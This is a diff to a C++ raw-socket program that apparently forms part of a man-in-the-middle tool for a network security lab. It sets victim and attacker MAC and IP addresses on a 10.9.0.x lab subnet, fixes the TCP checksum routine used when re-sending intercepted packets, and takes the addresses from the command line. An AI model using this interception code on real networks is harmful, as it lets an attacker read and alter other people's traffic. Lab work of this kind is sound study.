@@ -9,6 +9,7 @@
 #include <linux/if_packet.h> // for sockaddr_ll
 #include <sys/ioctl.h> // for ioctl
 #include <net/if.h> // for freq
+#include <netinet/ether.h> // ether_aton
 using namespace std;
 unsigned char vicitim1MAC[6];
 unsigned char vicitim2MAC[6];
@@ -18,13 +19,22 @@ uint32_t victim2IP;
 uint32_t attackerIP;
 int rawSocket;
 
+string SRC_MAC; //"02:42:0a:09:00:05"
+string DST_MAC; // "02:42:0a:09:00:06"
+string ATT_MAC; // "02:42:0a:09:00:69"
+string SRC_IP; // "10.9.0.5"
+string DST_IP; // "10.9.0.6"
+string ATT_IP; // "10.9.0.105"
+
+
+
 typedef struct PseudoHeader
 {
-    unsigned long int sourceIP;
-    unsigned long int destIP;
+    uint32_t  sourceIP;
+    uint32_t  destIP;
     unsigned char reserved;
     unsigned char protcol;
-    unsigned short int segmentLength;
+    uint16_t  segmentLength;
 }PseudoHeader;
 
 void printPacket(unsigned char* buf, int bufSize)
@@ -154,35 +164,54 @@ int parsePacket(unsigned char* buf, int bufSize)
     return 0;
     
 }
+// this checksum function has bug in it can't handle all the cases.... so i had to stop using it
+// unsigned short computeIPChecksum(unsigned char *header, int len)
+// {
+//     long sum = 0;
+//     unsigned short *ipHeader = (unsigned short *) header;
 
-unsigned short computeIPChecksum(unsigned char *header, int len)
-{
-    long sum = 0;
-    unsigned short *ipHeader = (unsigned short *) header;
+//     while(len>1)
+//     {
+//         sum += *ipHeader;
+//         ipHeader++;
+//         if(sum & 0x80000000)
+//         {
+//             sum = (sum & 0xFFFF) + (sum >> 16);
+//         }
+//         len -= 2;
+//     }
 
-    while(len>1)
-    {
-        sum += *ipHeader;
-        ipHeader++;
-        if(sum & 0x80000000)
-        {
-            sum = (sum & 0xFFFF) + (sum >> 16);
-        }
-        len -= 2;
-    }
+//     if(len)
+//     {
+//         sum += *ipHeader;
+//     }
 
-    if(len)
-    {
-        sum += *ipHeader;
-    }
+//     while(sum>>16)
+//     {
+//         sum = (sum & 0xFFFF) + (sum>>16);
+//     }
 
-    while(sum>>16)
-    {
-        sum = (sum & 0xFFFF) + (sum>>16);
-    }
+//     return ~sum;
 
-    return ~sum;
+// }
 
+unsigned short computeIPChecksum(unsigned short *addr, unsigned int count) {
+  register unsigned long sum = 0;
+  while (count > 1) {
+    sum += * addr++;
+    count -= 2;
+  }
+  //if any bytes left, pad the bytes and add
+  if(count > 0) {
+    sum += ((*addr)&htons(0xFF00));
+  }
+  //Fold sum to 16 bits: add carrier to result
+  while (sum>>16) {
+      sum = (sum & 0xffff) + (sum >> 16);
+  }
+  //one's complement
+  sum = ~sum;
+  return ((unsigned short)sum);
 }
 
 void forwardPacket(unsigned char* buf, int bufSize)
@@ -290,8 +319,10 @@ void forwardPacket(unsigned char* buf, int bufSize)
     memcpy((hdr+sizeof(PseudoHeader)+tcpHeader->doff*4),payload,payloadLength);
     
     
-    tcpHeader->check = (computeIPChecksum((unsigned char *)hdr,pseudoAndTCPHeaderLength));
+    tcpHeader->check = (computeIPChecksum((unsigned short *)hdr,pseudoAndTCPHeaderLength));
+    printUnsignedCharArr("checksum hdr: ", hdr,pseudoAndTCPHeaderLength);
     cout<<"tcp header checksum"<<endl;
+    
     // cout<<tcpHeader->check<<endl;
     // printf("%x\n",tcpHeader->check);
 
@@ -462,26 +493,27 @@ int bindRawSocketToInterface(char *device, int rawSocket)
 
 }
 
-int main()
+int main(int argc, char* argv[])
 {
-    unsigned char temp1[] =  {0x02, 0x42, 0x0a, 0x09, 0x00, 0x05};
-    memcpy(vicitim1MAC, temp1 , 6);
-    unsigned char temp2[] =  {0x02, 0x42, 0x0a, 0x09, 0x00, 0x06};
-    memcpy(vicitim2MAC, temp2 , 6);
-    unsigned char temp3[] =  {0x02, 0x42, 0x0a, 0x09, 0x00, 0x69};
-    memcpy(attackerMAC, temp3 , 6);
-    victim1IP=0xa090005; // 10.9.0.5
-    victim2IP=0xa090006; // 10.9.0.6
-    attackerIP=0xa090069; // 10.9.0.105
-    // Destination MAC: 02 42 0a 09 00 06 
-    // Source MAC: 02 42 0a 09 00 69 
-    // Protocol Type: 08 00 
-    // Destination IP: a090006
-    // Source IP: a090005
-    // Destination Port: 9090
-    // Source Port: 55000
-    // Payload size: 3
-    // Application Layer Data: 68 69 0a 
+    if(argc!=7)
+    {
+        cout<<"wrong input format!"<<endl;
+        exit(-1);
+    }
+    SRC_MAC = string(argv[1]);
+    DST_MAC = string(argv[2]);
+    ATT_MAC = string(argv[3]);
+    SRC_IP = string(argv[4]);
+    DST_IP = string(argv[5]);
+    ATT_IP = string(argv[6]);
+    
+    memcpy(vicitim1MAC,ether_aton(SRC_MAC.c_str()),6);
+    memcpy(vicitim2MAC,ether_aton(DST_MAC.c_str()),6);
+    memcpy(attackerMAC,ether_aton(ATT_MAC.c_str()),6);
+    victim1IP=ntohl(inet_addr(SRC_IP.c_str())); // 10.9.0.5
+    victim2IP=ntohl(inet_addr(DST_IP.c_str())); // 10.9.0.6
+    attackerIP=ntohl(inet_addr(ATT_IP.c_str())); // 10.9.0.105
+    
 
 
     size_t pktBufSize = 10*1024;
